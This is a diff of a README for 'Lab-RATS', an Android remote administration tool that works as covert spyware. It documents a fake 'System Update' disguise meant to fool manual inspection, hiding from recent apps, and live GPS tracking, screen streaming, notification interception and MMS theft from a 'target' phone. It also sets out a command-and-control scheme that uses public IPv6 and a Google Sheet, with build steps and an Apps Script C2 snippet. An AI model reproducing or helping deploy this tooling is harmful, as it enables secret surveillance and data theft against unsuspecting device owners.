@@ -1,8 +1,9 @@
-[![Screenshot-2026-06-28-at-8-21-29-AM.png](https://i.postimg.cc/rFGWqKMp/Screenshot-2026-06-28-at-8-21-29-AM.png)](https://postimg.cc/Yh9j324c)
+<p align="center">
+[![Screenshot-2026-07-03-at-2-55-28-AM.png](https://i.postimg.cc/2S1JKdt7/Screenshot-2026-07-03-at-2-55-28-AM.png)](https://postimg.cc/xXStkmnX)
 
 # 🐀 Lab-RATS: Advanced Android Remote Administration Tool (v1.3.2)
 
-**Lab-RATS** is a **powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a sleek, **web-based interface** designed for speed and reliability. Built for the modern era, it fully supports the latest **2026 Android software releases** *(OneUI 8.5, SDK 36)*.
+**Lab-RATS** is a **powerful** and **lightweight Android Remote Administration Tool (RAT)** developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a **sleek, web-based interface** designed for speed and reliability. Built for the modern era, it fully supports the latest **2026 Android software releases** *(OneUI 8.5, SDK 36)*.
 
 ---
 
@@ -11,12 +12,6 @@
 -   📦 **Automated APK Generation**: Instantly build both `signed.apk` *(for production)* and `unsigned.apk`.
 -   🆔 **Advanced Identity Control**: Fully customize **App Name**, **Package ID**, and **Minimum SDK**.
 -   🔐 **C2 Security Layer**: The web dashboard is protected by a secure login wall (**Default Password: admin1337**). The password can be updated directly from the Terminal home page for enhanced security.
--   🕵️ **Stealth-First Design**:
-    -   **Launcher Stealth**: Remotely replace the app icon with a generic "System Update" gear using an Activity Alias (Masquerade Mode). When active, the app opens a convincing **Fake System Update screen** instead of the C2 dashboard to bypass human inspection.
-    -   **Dial-Pad Recovery**: If hidden, dial `*#1337#` on the phone's keypad to re-enable the icon and launch the interface.
-    -   **Backdoor Access**: Rapidly tapping the icon on the Fake System Update screen 5 times also restores access to the primary dashboard.
-    -   **Recent Apps Exclusion**: The app is completely invisible in the Android task switcher (recent apps list).
-    -   **Dynamic Masquerading**: Randomly generates **Version Names** and **Version Codes** to blend in as system updates.
 -   🎨 **Smart Branding Engine**:
     -   **Auto-Density Scaling**: Resizes logos automatically for all Android screen densities.
     -   **Transparency Fixer**: Removes white backgrounds from logo assets automatically.
@@ -24,11 +19,24 @@
 
 ---
 
+## 🕵️ Covert & Stealth Operations
+
+-   🎭 **Launcher Masquerade**: Remotely swap the app icon and name with a generic "System Update" sprocket gear.
+-   🛠️ **Interactive Decoy UI**: When hidden, the app launches a convincing **Fake System Update** screen. This interface includes a functional "Check for update" button, realistic progress animations, and system-style notifications to bypass manual inspection.
+-   🌓 **Adaptive Stealth Theme**: The decoy interface automatically syncs with the device's **Light/Dark Mode** settings, including status bar color-switching, to maintain a perfect native appearance.
+-   ☎️ **Dial-Pad Recovery**: If the icon is hidden, **dial `*#1337#` on the phone's keypad** to instantly restore the original Lab-RATS identity and launch the dashboard.
+-   🚪 **Backdoor Access**: Rapidly tapping the sprocket gear on the Fake Update screen **10 times** bypasses the decoy and opens the primary C2 dashboard.
+-   👻 **Task-List Stealth**: The app is hard-coded to be invisible in the Android "Recent Apps" list, preventing discovery during multitasking.
+-   🎲 **Version Camouflage**: Dynamically generates random **Version Names** and **Codes** that mimic legitimate OTA updates.
+-   📡 **Notification Hijacking**: When stealth is active, all background service notifications are rebranded as "System Update" with matching assets to ensure zero branding leaks in the notification tray.
+
+---
+
 ## 🚀 The Fun Stuff (Remote Capabilities)
 
 -   🛰️ **Precision GPS Tracking**: One-click uplink to open the target's **exact real-time location** in Google Maps.
 -   📱 **Remote Screen Projection (Gold Standard)**: Stream the device's screen in **real-time** directly to your web browser with a single click. Built with a specialized **Android 16** compatibility layer for flawless performance on the latest hardware.
--   ⚡ **Intel Stream (Notification Sniffer)**: Intercept every notification that hits the device (*WhatsApp, Telegram, RCS, System*) and view them in a **live** chronological feed.
+-   ⚡  **Intel Stream (Notification Sniffer)**: Intercept every notification that hits the device (*WhatsApp, Telegram, RCS, System*) and view them in a **live** chronological feed.
 -   🖼️ **MMS Terminal (Game Changer!)**:
     -   **Browse & Extract**: Download and view **ANY Multimedia Message (MMS)** including **Images and Videos** stored on the device.
     -   **Remote Dispatch**: Send **MMS/Picture Messages** directly from the target phone with a built-in **file browser** to pick media from your PC.
@@ -62,6 +70,10 @@
 </p>
 
 <p align="center">
+<b>--- &gt; Covert App Icon & Fake Update Overlay Using Masquerade Mode &lt; ---</b><br>
+<a href="https://postimg.cc/063h6QNL" target="_blank"><img src="https://i.postimg.cc/063h6QNL/SYS-Update-icon.png" alt="SYS-Update-icon"></a> <a href="https://postimg.cc/v1jC1BmJ" target="_blank"><img src="https://i.postimg.cc/v1jC1BmJ/Fake-update.png" alt="Fake-update"></a>
+
+<p align="center">
   <b>--- &gt; Remote Web Control Panel (Mobile Interface) &lt; ---</b><br>
 <a href='https://postimg.cc/Jt74MHjh' target='_blank'><img src='https://i.postimg.cc/Jt74MHjh/Mobile-interface-Home.png' border='0' alt='Mobile-interface-Home'></a> <a href="https://postimg.cc/dLpyhj9S" target="_blank"><img src="https://i.postimg.cc/dLpyhj9S/Mobile-cam-menu.png" alt="Mobile-cam-menu"></a> <a href="https://postimg.cc/ZC2dWxLs" target="_blank"><img src="https://i.postimg.cc/ZC2dWxLs/Mobile-cam-menu1.png" alt="Mobile-cam-menu1"></a> <a href="https://postimg.cc/F78LYVxW" target="_blank"><img src="https://i.postimg.cc/F78LYVxW/Mobile-interface-GPS.png" alt="Mobile-interface-GPS"></a> <a href="https://postimg.cc/r0VdBn8X" target="_blank"><img src="https://i.postimg.cc/r0VdBn8X/Mobile-interface-SMS.png" alt="Mobile-interface-SMS"></a>
 </p>
@@ -88,15 +100,15 @@
 
 During security research, a **critical behavior** in modern Android networking was discovered: devices on **mobile data** (and modern WiFi) are assigned **Public IPv6 Addresses**.
 
-Unlike IPv4—which is heavily restricted by NAT and requires complex port forwarding—**IPv6 addresses are directly routeable on the public internet.**
+Unlike IPv4—which is **heavily restricted by NAT** and requires complex port forwarding—**IPv6 addresses are **directly routeable** on the public internet.**
 
 ### How Lab-RATS Exploits This:
 1.  **Distributed Server**: The app initializes a **lightweight HTTP server** on the Android device **(Port 8080)**.
 2.  **Zero Configuration**: Because the device uses Public IPv6, you can access the terminal **directly from anywhere in the world** without router setup, firewalls, or tunnels (*Ngrok/Pinggy*).
-3.  **Dynamic IP Solution**: Mobile networks rotate IPs frequently. Lab-RATS solves this by using a **Google Sheet as a "Command & Control(C2) Phonebook."**
-4.  **Stealth Uplink**: The app silently detects its current IPv6 and posts the live link to your sheet. You simply open the sheet and click the latest link to regain control.
+3.  **Dynamic IP Solution**: Mobile networks rotate IPs frequently. Lab-RATS solves this by using a **Google Sheet as a "Command & Control (C2) Phonebook"**.
+4.  **Stealth Uplink**: The app **silently detects** its current IPv6 and posts the live link to your sheet. You simply open the sheet and click the latest link to regain control.
 
-> **Effectively, this turns any infected device into a public web server, tracked by a private "C2 phonebook".**
+> **Effectively, this turns ANY infected device into a public web server, tracked by a private "C2 phonebook".**
 
 ---
 
@@ -115,7 +127,7 @@ Unlike IPv4—which is heavily restricted by NAT and requires complex port forwa
     *   **Linux/Mac**: `chmod +x build.sh && ./build.sh`
 4.  Select **Option 1** and provide your configuration:
     *   **App Name**: (Default: LAB-RATS)
-    *   **Google Sheet URL**: Your Apps Script URL (instructions below).
+    *   **Google Sheet URL**: Your Apps Script URL (*instructions below*).
 5.  Retrieve your `signed.apk` from the `output/` directory.
 
 ---
@@ -124,7 +136,7 @@ Unlike IPv4—which is heavily restricted by NAT and requires complex port forwa
 
 1.  Create a new **Google Sheet**.
 2.  Go to **Extensions** → **Apps Script**.
-3.  Replace the default code with this snippet:
+3.  **Replace** the **default code** with this snippet:
 
 ```javascript
 // Lab-RATS C2 Tracking Script
@@ -146,8 +158,8 @@ function setupSheet() {
   sheet.getRange("A1:F1").setFontWeight("bold").setBackground("#050505").setFontColor("#00f2ff");
 }
 ```
-4.  **Deploy** → **Web App** → Execute as **Me** → Access **Anyone**.
-5.  Paste the generated URL into the APK Builder when prompted.
+4.  **Deploy** → **Web App** → **Execute as Me** → **Access Anyone**.
+5.  Paste the **generated URL** into the **APK Builder** when prompted.
 
 <p align="center">
   <b>--- &gt; Example Google Sheet - Running &amp; Properly Configured &lt; ---</b><br>
